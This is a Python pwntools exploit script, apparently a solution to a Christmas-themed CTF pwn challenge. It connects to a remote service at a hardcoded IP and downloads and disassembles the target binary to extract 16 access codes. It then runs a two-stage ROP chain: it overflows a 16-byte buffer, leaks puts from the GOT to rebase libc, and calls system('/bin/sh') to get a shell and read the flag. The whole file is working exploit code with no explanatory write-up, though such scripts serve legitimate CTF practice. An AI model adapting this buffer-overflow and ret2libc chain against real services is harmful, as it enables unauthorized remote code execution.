#!/usr/bin/python

import gzip
import base64
from StringIO import StringIO

from pwn import *
import distorm3



class OhShit(Exception):
    pass


class PWN:
    def __init__(self):
        self.main_menu = False

        self.binary = None  # binary code
        self.codes  = []    # access codes

        self.binpath = 'gift.bin'

        # prepare locale libc
        self.libc = ELF('./libc.so')
        self.libc_rop = ROP(self.libc)

        # leaked puts address
        self.leaked_puts = 0x0

        self.io = remote("18.205.93.120", 1205)

        trash = self.read_until_menu()

    def read_until_menu(self):
        lines = []
        save = True
        while True:
            data = self.io.readline(timeout=1)
            # \n is the start of the menu
            if data == ' \n':
                save = False

            if save:
                lines.append(data.strip())

            # last menu line doesnt ends with \n
            if data == '':
                data = self.io.recv(10, timeout=1)

            if data == ' > ':
                self.main_menu = True
                break
                
        return lines



    def get_binary(self):
        ''' get base 64 binary
        '''
        p = log.progress('getting binary...')
        if not self.main_menu:
            p.failure('not in the menu')
            raise OhShit

        b64binary = ''
        self.io.sendline('1')       # 1 is for the download
        self.main_menu = False
        p.status('downloading base64')
        array = self.read_until_menu()

        # reconstruct base64 data
        b64data = ''
        for line in array:
            # skip the crap
            if line in ('Santa hands you your XMAS gift: (', ')'):
                continue

            b64data += line

        p.status('gunzipping the crap')

        # unbase64
        gzipdata = StringIO(base64.b64decode(b64data))

        # ungzip
        self.binary =  gzip.GzipFile(fileobj=gzipdata, mode='rb').read()
        with open(self.binpath, 'wb') as fp:
            fp.write(self.binary)
        p.success('got it')



    def enter_codes(self):
        ''' play the code
        '''
        p = log.progress('entering the codes...')
        if not len(self.codes):
            p.failure('codes are missing')
            raise OhShit

        self.io.sendline('666')     # hidden menu
        self.main_menu = False

        # get till input fild
        while True:
            line = self.io.readline()
            if line == 'Aha! You found Santas secret backdoor to the PWNSHOP ... hope you know the keycodes\n':
                break

        # input all 16 codes 
        for x in range(0x10):
            p.status("code %d"%x)
            inp = self.io.recv(100).strip()
            #print [inp]
            self.io.sendline(self.codes[x])

        # did we make it ?
        data = self.io.recv(4096)
        if data.find('ACCESS GRANTED') > -1:
            p.success('access granted')
        else:
            p.failure('shit happened!')
            raise OhShit




    def get_codes(self):
        ''' parse binary to extract access codes
        '''
        p = log.progress('getting access codes...')
        if not self.binary:
            p.failure("missing binary")
            raise OhShit

        p.status('disassembling')
        disasm = {}

        iterable = distorm3.DecodeGenerator(0x0, self.binary, distorm3.Decode32Bits)
        for (offset, size, instruction, hexdump) in iterable:
            disasm[offset] = (size, instruction)


        #start = 0x000007b9
        # this is where the check sequence starts
        start = 0x000007bf
        instructions = []

        p.status('parsing instructions')

        # get interesting instructions
        for x in range(16):
            size, instr = disasm[start]
            instructions.append(instr)
    
            # hop 2 instructions

            start += size
            size, instr = disasm[start]
    
            start += size
            size, instr = disasm[start]
            start += size


        # parse interesting instructions
        for instr in instructions:
            # just checking it's != 0
            if instr == 'TEST EAX, EAX':
                self.codes.append("1")

            # else we get the check value
            elif instr.startswith('CMP EAX, '):
                value = instr.split(" ")[-1]
                self.codes.append(str(eval(value)))

        p.success(' '.join(self.codes))


    def stage1_exploit(self):
        log.info('building stage1 payload to leak libc address')

        self.elf = ELF(self.binpath)
        self.elf_rop = ROP(self.elf)

        # we want to leak puts address (which is in the GOT)
        # and return to win again so we can send stage2 payload

        self.elf_rop.puts(self.elf.got['puts'])
        self.elf_rop.call(self.elf.symbols['win'])
        log.info('stage 1 rop: read(puts()); call win')
        print self.elf_rop.dump()

        # we know we need 16 bytes to get to EIP
        payload = 'A'*16
        payload += str(self.elf_rop)

        # send shellcode
        log.info('sending payload 1')
        self.io.sendline(payload)

        data = self.io.readline()

        # get leaked puts address:
        self.leaked_puts = struct.unpack('I', data[:4])[0]
        log.info("Leaked puts: {}".format(hex(self.leaked_puts)))


    def stage2_exploit(self):
        log.info('building stage2 payload to spawn shell')
        
        # rebase libc
        self.libc.address = self.leaked_puts - self.libc.symbols['puts']
        log.info('rebased libc address: {}'.format(hex(self.libc.address)))

        self.libc_rop.system(next(self.libc.search('/bin/sh\x00')))
        
        log.info('stage 2 rop: system("/bin/sh")')
        print self.libc_rop.dump()

        # we still need 16 bytes
        payload = 'A'*16
        payload += str(self.libc_rop)

        # clean i/o buffer
        self.io.clean()
        
        log.info('sending payload 2')
        self.io.sendline(payload)

        log.info('got shell')
        self.io.sendline("cat flag")
        flag = self.io.readline()
        log.success("flag:  %s"%flag)

        #self.io.interactive()



if __name__ == "__main__":
    try:
        yop = PWN()
        yop.get_binary()
        yop.get_codes()
        yop.enter_codes()
        #context.log_level = 'debug'
        yop.stage1_exploit()
        yop.stage2_exploit()
    except OhShit:
        yop.io.close()

